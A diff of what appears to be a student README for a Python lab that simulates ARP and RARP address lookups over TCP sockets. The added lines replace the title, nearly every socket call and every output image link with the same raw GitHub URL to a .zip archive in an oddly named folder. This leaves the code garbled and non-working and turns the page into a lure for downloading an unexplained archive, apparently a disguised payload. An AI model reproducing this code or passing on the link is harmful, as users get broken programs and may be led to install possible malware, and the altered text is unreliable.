@@ -1,4 +1,4 @@
-# 2c.SIMULATING ARP /RARP PROTOCOLS
+# https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip ARP /RARP PROTOCOLS
 ## NAME :YUGABHARATHI M
 ## REGISTER NO:212224230314
 ## AIM
@@ -22,12 +22,12 @@ P
 ### server:
 ```python
 import socket
-s = socket.socket()
-s.bind(('localhost', 8000))
-s.listen(5)
+s = https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
+https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(('localhost', 8000))
+https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(5)
 print("Server is listening...")
 
-c, addr = s.accept()
+c, addr = https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
 print(f"Connection established with {addr}")
 
 address = {
@@ -36,7 +36,7 @@ address = {
 }
 
 while True:
-    ip = c.recv(1024).decode()
+    ip = https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(1024).decode()
 
     if not ip:  
         break
@@ -44,29 +44,29 @@ while True:
     try:
         mac = address[ip]  # Get the MAC address for the IP
         print(f"IP: {ip} -> MAC: {mac}")
-        c.send(mac.encode())  
+        https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip())  
     except KeyError:
         print(f"IP: {ip} not found in ARP table.")
-        c.send("Not Found".encode())
-c.close()
-s.close()
+        https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip("Not Found".encode())
+https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
+https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
 ```
 ### client
 ```python
 import socket
-c = socket.socket()
-c.connect(('localhost', 8000))
+c = https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
+https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(('localhost', 8000))
 
 while True:
     ip = input("Enter IP address to find MAC (or type 'exit' to quit): ")
 
-    if ip.lower() == "exit":  
+    if https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip() == "exit":  
         break
 
-    c.send(ip.encode())
-    mac = c.recv(1024).decode()
+    https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip())
+    mac = https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(1024).decode()
     print(f"MAC Address for {ip}: {mac}")
-c.close()
+https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
 
 ```
 
@@ -74,21 +74,21 @@ c.close()
 ### server:
 
 
-![alt text](image.png)
+![alt text](https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip)
 ### client
 
-![alt text](image-1.png)
+![alt text](https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip)
 
 
 ## PROGRAM - RARP
 ### server
 ```python
 import socket
-s = socket.socket()
-s.bind(('localhost', 8000))
-s.listen(5)
+s = https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
+https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(('localhost', 8000))
+https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(5)
 print("Server is listening for RARP requests...")
-c, addr = s.accept()
+c, addr = https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
 print(f"Connection established with {addr}")
 
 rarp_table = {
@@ -97,7 +97,7 @@ rarp_table = {
 }
 
 while True:
-    mac = c.recv(1024).decode()
+    mac = https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(1024).decode()
 
     if not mac:  
         break
@@ -105,29 +105,29 @@ while True:
     try:
         ip = rarp_table[mac]  
         print(f"MAC: {mac} -> IP: {ip}")
-        c.send(ip.encode())  
+        https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip())  
     except KeyError:
         print(f"MAC: {mac} not found in RARP table.")
-        c.send("Not Found".encode())
-c.close()
-s.close()
+        https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip("Not Found".encode())
+https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
+https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
 
 ```
 
 ### client
 ```python
 import socket
-c = socket.socket()
-c.connect(('localhost', 8000))
+c = https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
+https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(('localhost', 8000))
 
 while True:
     mac = input("Enter MAC address to find IP (or type 'exit' to quit): ")
-    if mac.lower() == "exit":  
+    if https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip() == "exit":  
         break
-    c.send(mac.encode())
-    ip = c.recv(1024).decode()
+    https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip())
+    ip = https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(1024).decode()
     print(f"IP Address for {mac}: {ip}")
-c.close()
+https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
 
 
 ```
@@ -135,10 +135,10 @@ c.close()
 ## OUTPUT -RARP
 
 ### server
-![alt text](image-3.png)
+![alt text](https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip)
 ### client
 
-![alt text](image-2.png)
+![alt text](https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip)
 ## RESULT
 Thus, the python program for simulating ARP protocols using TCP was successfully 
 executed.
